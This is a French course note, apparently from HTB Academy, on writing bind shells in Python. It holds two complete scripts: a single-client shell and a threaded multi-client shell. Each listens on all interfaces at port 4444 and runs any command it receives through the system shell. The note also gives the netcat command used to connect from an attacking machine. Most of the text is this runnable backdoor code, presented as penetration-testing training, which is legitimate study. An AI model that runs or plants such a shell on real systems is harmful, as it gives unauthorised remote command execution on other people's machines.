---
tags:
  - python
  - scripting
  - bind-shell
  - networking
  - course/htb-academy
---

# A Simple Bind Shell

## Principe

Un **bind shell** est un processus qui :
1. Se bind à une adresse et un port sur la machine cible.
2. Écoute les connexions entrantes.
3. Reçoit des commandes en bytes, les exécute en local, et renvoie l'output.

## Version de base

```python
import socket
import subprocess
import click

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))  # toutes les interfaces
    s.listen(4)                 # max 4 connexions en attente
    client_socket, address = s.accept()  # bloquant — attend une connexion

    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]  # [:-1] retire le \n final

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

if __name__ == '__main__':
    main()
```

Connexion depuis la machine attaquante :

```bash
nc 10.10.10.10 4444 -nv
```

**Limite** : une seule connexion à la fois — le process s'arrête à la déconnexion.

## Version multi-connexions avec threads

Les **threads** permettent d'exécuter du code de façon concurrente. Ici : le thread principal reste en écoute pendant qu'un thread secondaire gère chaque client connecté.

```python
import socket
import subprocess
import click
from threading import Thread

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

def handle_input(client_socket):
    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)

    while True:
        client_socket, _ = s.accept()
        t = Thread(target=handle_input, args=(client_socket,))  # tuple à 1 valeur : (val,)
        t.start()

if __name__ == '__main__':
    main()
```

Points clés :
- `Thread(target=func, args=(val,))` : crée un thread qui exécute `func` avec `val` en paramètre.
- `t.start()` : démarre le thread en arrière-plan.
- `args=(client_socket,)` : la virgule finale est obligatoire pour un tuple à un seul élément — sans elle, Python interprète les parenthèses comme un groupement, pas un tuple.
- `_` : variable placeholder pour la valeur `address` retournée par `accept()` dont on n'a pas besoin.
